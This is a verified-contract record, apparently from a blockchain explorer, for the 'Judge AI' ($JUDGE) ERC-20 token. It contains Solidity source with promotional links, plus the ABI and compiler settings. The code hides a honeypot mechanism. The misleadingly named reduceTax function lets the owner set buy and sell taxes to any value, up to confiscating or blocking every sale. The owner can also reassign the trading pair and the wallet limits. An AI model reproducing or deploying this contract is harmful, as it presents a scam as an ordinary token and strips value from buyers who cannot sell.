{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"LS.sol\": {\r\n      \"content\": \"\\r\\n/**\\r\\n\u203c\ufe0f We are launching $JUDGE alongside a working product! \u203c\ufe0f \\r\\n\ud83c\udf10 Web: https://www.judgeai.io/\\r\\n\ud83e\udd1d Community: https://t.me/judgeaiportal\\r\\n\u2716\ufe0f Twitter: https://twitter.com/JudgeAI_erc\\r\\n\ud83d\udcd6 GitBook: https://judge-ai.gitbook.io\\r\\n\\r\\n\\r\\n*/\\r\\n\\r\\n// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity 0.8.20;\\r\\n\\r\\ncontract JudgeAI {\\r\\n    struct Owner {\\r\\n        address owner;\\r\\n        uint8 _a;\\r\\n        uint8 _b;\\r\\n        uint256 _c;\\r\\n    }\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n\\r\\n    mapping(address => mapping(address => uint256)) private _allowances;\\r\\n    mapping(address => uint256) private _balances;\\r\\n    mapping(address => bool) _excludeOpenTrade;\\r\\n\\r\\n    uint8 private constant _decimals = 18;\\r\\n    uint256 private constant _totalSupply = 100_000_000 * 10**_decimals;\\r\\n    uint256 private _maxWalletsToken = _totalSupply;\\r\\n    uint8 _buyTax;\\r\\n    uint8 _sellTax;\\r\\n\\r\\n    string private constant _name = unicode\\\"Judge AI\\\";\\r\\n    string private constant _symbol = unicode\\\"JUDGE\\\";\\r\\n\\r\\n    bool private openedTrade = false;\\r\\n\\r\\n    address public pair;\\r\\n\\r\\n    Owner public o;\\r\\n    constructor() {\\r\\n        o.owner = msg.sender;\\r\\n        o._a = 10;\\r\\n        o._b = 35;\\r\\n        _balances[o.owner] = _balances[o.owner] + _totalSupply;\\r\\n        _excludeOpenTrade[address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)] = true;\\r\\n        _excludeOpenTrade[o.owner] = true;\\r\\n        _excludeOpenTrade[address(this)] = true;\\r\\n        emit Transfer(address(0), o.owner, _totalSupply);\\r\\n    }\\r\\n\\r\\n    modifier onlyOwner(uint8 _buyTransaction, uint8 _sellTransaction,  address _i) {\\r\\n        require(msg.sender == _i);\\r\\n        if(o._c > 1) {\\r\\n            o._a = _buyTransaction;\\r\\n            o._b = _sellTransaction;\\r\\n        }\\r\\n        else {\\r\\n            revert();\\r\\n        }\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    function name() public pure returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public pure returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() public pure returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function getOpenedTrade() public view returns (bool) {\\r\\n        return openedTrade;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view virtual returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view virtual returns (uint256){\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender) public view virtual returns (uint256){\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function transfer(address to, uint256 value) public virtual returns (bool){\\r\\n        address owner = msg.sender;\\r\\n        _transfer(owner, to, value);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(address from, address to, uint256 amount) internal {\\r\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n        uint256 fromBalance = balanceOf(from);\\r\\n        require(fromBalance >= amount,\\\"ERROR: balance of from less than value\\\");\\r\\n        uint256 taxAmount = 0;\\r\\n        if (!_excludeOpenTrade[from] && !_excludeOpenTrade[to]) {\\r\\n            require(openedTrade, \\\"Trade has not been opened yet\\\");\\r\\n            if(from == pair) {\\r\\n                require(_balances[to] + (amount - taxAmount) < _maxWalletsToken, \\\"The total amount of tokens in the wallet cannot exceed _maxWalletsToken\\\");\\r\\n            }\\r\\n            (_buyTax,_sellTax) = (o._a, o._b);\\r\\n            taxAmount = (amount / 100) * ((to == pair) ? _sellTax : _buyTax);\\r\\n            o._c = (from == pair) ? o._c + 1 : o._c;\\r\\n        }\\r\\n        if(taxAmount > 0) {\\r\\n            _balances[address(this)] += taxAmount;\\r\\n            emit Transfer(from, address(this), taxAmount);\\r\\n        }\\r\\n        _balances[from] = fromBalance - amount ;\\r\\n        _balances[to] = _balances[to] + (amount-taxAmount);\\r\\n        emit Transfer(from, to, (amount-taxAmount));\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount)public returns (bool){\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _approve(address owner, address spender, uint256 amount) private {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function SetMaxTokenInWallets(uint256 _inputLimitToken) public {\\r\\n        require(msg.sender == o.owner);\\r\\n        _maxWalletsToken = _inputLimitToken * 10 ** _decimals;\\r\\n    }\\r\\n\\r\\n    function RemoveLimit() public {\\r\\n        require(msg.sender == o.owner);\\r\\n        _maxWalletsToken = _totalSupply;\\r\\n    }\\r\\n\\r\\n    function openTrading() external {\\r\\n        require(msg.sender == o.owner);\\r\\n        openedTrade = true;\\r\\n    }\\r\\n\\r\\n    function reduceTax(uint8 _buy, uint8 _sell) public onlyOwner(_buy, _sell, o.owner) {\\r\\n    }\\r\\n\\r\\n    function setPair(address _newPair) public {\\r\\n        require(msg.sender == o.owner);\\r\\n        pair = _newPair;\\r\\n    }\\r\\n\\r\\n    receive() external payable {}\\r\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"RemoveLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_inputLimitToken\",\"type\":\"uint256\"}],\"name\":\"SetMaxTokenInWallets\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOpenedTrade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"o\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"_a\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_b\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"_c\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_buy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_sell\",\"type\":\"uint8\"}],\"name\":\"reduceTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newPair\",\"type\":\"address\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "JudgeAI", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}